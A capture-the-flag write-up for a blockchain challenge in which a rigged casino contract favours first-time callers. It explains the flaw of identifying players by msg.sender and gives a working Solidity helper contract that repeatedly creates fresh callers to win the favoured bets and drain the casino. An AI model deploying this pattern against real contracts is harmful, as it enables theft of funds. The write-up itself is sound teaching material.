  
# Rigged
 - Category: blockchain
 - Final point value: 276
 - Solved by: `fkil`

## Challenge Description

Playing unregulated online casino games on the blockchain where everyone is trustworthy is a surefire way to lose all your money. Or is it?

## Solution

The challenge emulates a casino, where players can make bets on outcomes and an external python service communicates the outcome to the casino contract. The casino backend service manipulates the odds in such a way that one wins the first 3-4 games of each sequence of 256 games with very high odds and otherwise loses with very low odds.

In particular, taking the coin flip as an example:
 - In the first few games there is a 100% chance to win and double one's bet
 - In the other games, there is only a 20% to win.

So how can we steal money from the casino? The problem lies in how players are identified. In particular, it uses the `msg.sender` attribute, which identifies the `caller` of the contract function. In Ethereum networks, however, we can create an arbitrary amount of contracts of our own, which we can abuse to call other contracts. If a contract calls the bet-placing function, the contract will be identified as the `msg.sender`, thus having high chances to win for the first three games.

This is the behavior that we will abuse for this challenge. We repeatedly create a new contract that will place bets for us and win money. Then, we take the money from the contract and repeat until we stole enough money.

Our helper contract uses the following solidity code:

```solidity
pragma solidity ^0.8.13;

import "./Chal.sol";

contract Pwner {
	address public immutable OWNER;
	Chal public immutable TARGET;

	constructor(address payable chal) payable {
		 OWNER = msg.sender;
		 TARGET = Chal(chal);
	}

	receive() external payable {}

	function doPwn(uint256 num) external payable {
		uint256 x = msg.value;
		require(x > 0, "msg.value must be > 0");

		uint256 individualBet = x / num;

		for (uint256 i = 0; i < num; ++i) {
			TARGET.playCoinFlip{value: individualBet}();
		}
	}

	function retrieve() external {
		 require(msg.sender == OWNER, "Not owner");
		 payable(OWNER).transfer(address(this).balance);
	}
}
```

We then instantiate this contract, call `doPwn(3)` with a `msg.value` of 3 ether, wait and then retrieve the won money. We repeat this until we depleted the casino.
